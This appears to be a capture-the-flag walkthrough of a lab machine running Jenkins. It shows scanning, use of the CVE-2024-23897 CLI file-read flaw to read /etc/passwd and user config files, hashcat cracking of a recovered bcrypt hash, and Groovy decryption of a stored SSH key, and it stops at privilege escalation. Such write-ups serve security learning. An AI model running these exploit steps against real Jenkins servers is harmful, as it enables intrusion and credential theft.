<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">sudo</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> nmap</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -p-</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> --min-rate</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387;"> 10000</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -oA</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> scans/tcp_allports</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> builder.htb</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">PORT     STATE SERVICE</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">22/tcp   open  ssh</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">8080/tcp open  http-proxy</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">sudo</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> nmap</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -p</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387;"> 22</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;">,8080</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -sC</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -sV</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -oA</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> scans/tcp_scripts</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> builder.htb</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">PORT     STATE SERVICE VERSION</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">| ssh-hostkey: </span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">8080/tcp open  http    Jetty 10.0.18</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">|_http-title: Dashboard [Jenkins]</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">| http-robots.txt: 1 disallowed entry </span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">|_/</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">| http-open-proxy: Potentially OPEN proxy.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">|_Methods supported:CONNECTION</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">|_http-server-header: Jetty(10.0.18)</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span></code></pre></figure>
<p>There are no hidden files or VHOSTs, etc., just the Jenkins page.</p>
<h1 id="foothold">Foothold<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#foothold" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<p>The CVE used to exploit Jenkins CLI <a href="https://www.zscaler.com/blogs/security-research/jenkins-arbitrary-file-leak-vulnerability-cve-2024-23897-can-lead-rce" class="external">CVE-2024-23897<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
<p>For the Jenkins version running the jenkins-cli can be exploited by downloading the <code>jenkins-cli.jar</code> off the website then using that to get a foothold.</p>
<h3 id="download-jenkins-cli">Download jenkins-cli<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#download-jenkins-cli" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>Download:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">wget</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> http://builder.htb:8080/jnlpJars/jenkins-cli.jar</span></span></code></pre></figure>
<p>Usage:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">java</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> jenkins-cli.jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -s</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> 'http://10.10.11.10:8080'</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> help</span></span></code></pre></figure>
<h3 id="get-commands-list">Get Commands list<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#get-commands-list" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>Get all help command: The sed is looking for 2 spaces and to remove them.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">java</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> jenkins-cli.jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -s</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> http://builder.htb:8080</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> help</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;"> 2>&amp;1</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;"> |</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;"> sed</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -n</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> '/[A-Z]/!s/  *//gp'</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">add-job-to-view</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">build</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">cancel-quiet-down</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">clear-queue</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">connect-node</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">console</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">copy-job</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">create-credentials-by-xml</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span></code></pre></figure>
<h3 id="execute-command-list">Execute Command list<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#execute-command-list" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">head</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> commands.txt</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;"> |</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;"> xargs</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -I</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> {}</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> sh</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -c</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> &quot;java -jar jenkins-cli.jar -s http://builder.htb:8080 '{}' @/etc/passwd > 'cmd/{}.out' 2>&amp;1&quot;</span></span></code></pre></figure>
<p>The command with the largest output was the <code>connect-node</code> command:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">find</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> cmd</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;"> |</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;"> xargs</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> wc</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -l</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;"> |</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;"> sort</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -nr</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;"> |</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;"> head</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">wc: cmd: Is a directory</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">     63 total</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">     22 cmd/connect-node.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      7 cmd/create-credentials-by-xml.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      6 cmd/create-job.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      6 cmd/create-credentials-domain-by-xml.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      5 cmd/clear-queue.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      5 cmd/cancel-quiet-down.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      3 cmd/copy-job.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      3 cmd/console.out</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      3 cmd/build.out</span></span></code></pre></figure>
<h3 id="getting-access-to-user">Getting Access to user<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#getting-access-to-user" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>The users.xml was found my looking through the Jenkins documentation page and I can across this <a href="https://www.jenkins.io/security/advisory/2018-12-05/#SECURITY-1072" class="external">resource<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> which details that the users information had been migrated to /users/users.xml below you can see the output of going to that file. For getting the actual user information I was about to find this <a href="https://www.jenkins.io/doc/upgrade-guide/2.138/#SECURITY-1072" class="external">security update<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> which details how the user migration was taking place for upgrading to Jenkins LTS 2.138.x. It shows that “In this case, rename the directory $JENKINS_HOME/users/admin_6635238516816951048/” which is how I was about to find jennifers hash.</p>
<p>Jenkins stores its users in <code>/var/jenkins_home/users/users.xml</code> this is where I found <code>jennifer_12108429903186576833</code></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">java</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> jenkins-cli.jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -s</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> http://builder.htb:8080</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> connect-node</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> @/var/jenkins_home/users/users.xml</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">&lt;?xml version='1.1' encoding='UTF-8'?>: No such agent &quot;&lt;?xml version='1.1' encoding='UTF-8'?>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      &lt;string>jennifer_12108429903186576833&lt;/string>: No such agent &quot;      &lt;string>jennifer_12108429903186576833&lt;/string>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">  &lt;idToDirectoryNameMap class=&quot;concurrent-hash-map&quot;>: No such agent &quot;  &lt;idToDirectoryNameMap class=&quot;concurrent-hash-map&quot;>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">    &lt;entry>: No such agent &quot;    &lt;entry>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">      &lt;string>jennifer&lt;/string>: No such agent &quot;      &lt;string>jennifer&lt;/string>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">  &lt;version>1&lt;/version>: No such agent &quot;  &lt;version>1&lt;/version>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">&lt;/hudson.model.UserIdMapper>: No such agent &quot;&lt;/hudson.model.UserIdMapper>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">  &lt;/idToDirectoryNameMap>: No such agent &quot;  &lt;/idToDirectoryNameMap>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">&lt;hudson.model.UserIdMapper>: No such agent &quot;&lt;hudson.model.UserIdMapper>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">    &lt;/entry>: No such agent &quot;    &lt;/entry>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span></code></pre></figure>
<p>Using <code>jennifer_12108429903186576833</code> in the path for user configs <code>/var/jenkins_home/users/jennifer_12108429903186576833/config.xml</code> we find in this file at the end there is a password hash.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">java</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> jenkins-cli.jar</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -s</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> http://builder.htb:8080</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> connect-node</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">&lt;passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash>: No such agent &quot;      &lt;passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash>&quot; exists.</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span></code></pre></figure>
<p>I took this has and made the file below:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">cat</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> jennifer_hash</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">jennifer:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</span></span></code></pre></figure>
<p>Then I used the hashcat command. Which cracked the password which came out to <code>princess</code>. With this password I am about to log into the Jenkins webpage as Jennifer.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="bash" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">$</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> hashcat</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> -m</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387;"> 3200</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> jennifer_hash</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> --user</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;"> /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="shellsession" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess</span></span>
<span data-line><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">...</span></span></code></pre></figure>
<h1 id="user">User<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#user" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<p>After logging into the Jenkins webpage I started digging around and came across the root user configuration. After trying to play with the update credentials I started digging in the html and was able to find:<br/>
<img src="../../../Pasted-image-20240308003439.png" width="auto" height="auto" alt/></p>
<p>The key will be pretty long:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="html" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="html" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;">&lt;</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;">input</span><span style="--shiki-light:#DF8E1D;--shiki-dark:#F9E2AF;"> name</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;">&quot;_.privateKey&quot;</span><span style="--shiki-light:#DF8E1D;--shiki-dark:#F9E2AF;"> type</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;">&quot;hidden&quot;</span><span style="--shiki-light:#DF8E1D;--shiki-dark:#F9E2AF;"> value</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;">&quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&quot;</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;">>&lt;/</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;">div</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;">></span></span></code></pre></figure>
<p>From here going the <code>/script</code> and doing the following from <a href="https://stackoverflow.com/questions/37683143/extract-passphrase-from-jenkins-credentials-xml/55799681#55799681" class="external">here<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="groovy" data-theme="catppuccin-latte catppuccin-mocha"><code data-language="groovy" data-theme="catppuccin-latte catppuccin-mocha" style="display:grid;"><span data-line><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">println</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">( </span><span style="--shiki-light:#8839EF;--shiki-dark:#CBA6F7;">hudson.util.Secret</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5;">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;">decrypt</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2;">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1;">&quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&quot;</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2;">)</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4;"> )</span></span></code></pre></figure>
<p>This will output the private key:<br/>
<img src="../../../Pasted-image-20240308003622.png" width="auto" height="auto" alt/></p>
<h1 id="privilege-escalation">Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#privilege-escalation" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<p>From getting the ssh key we can copy the private key to host system and make a keyfile:</p>
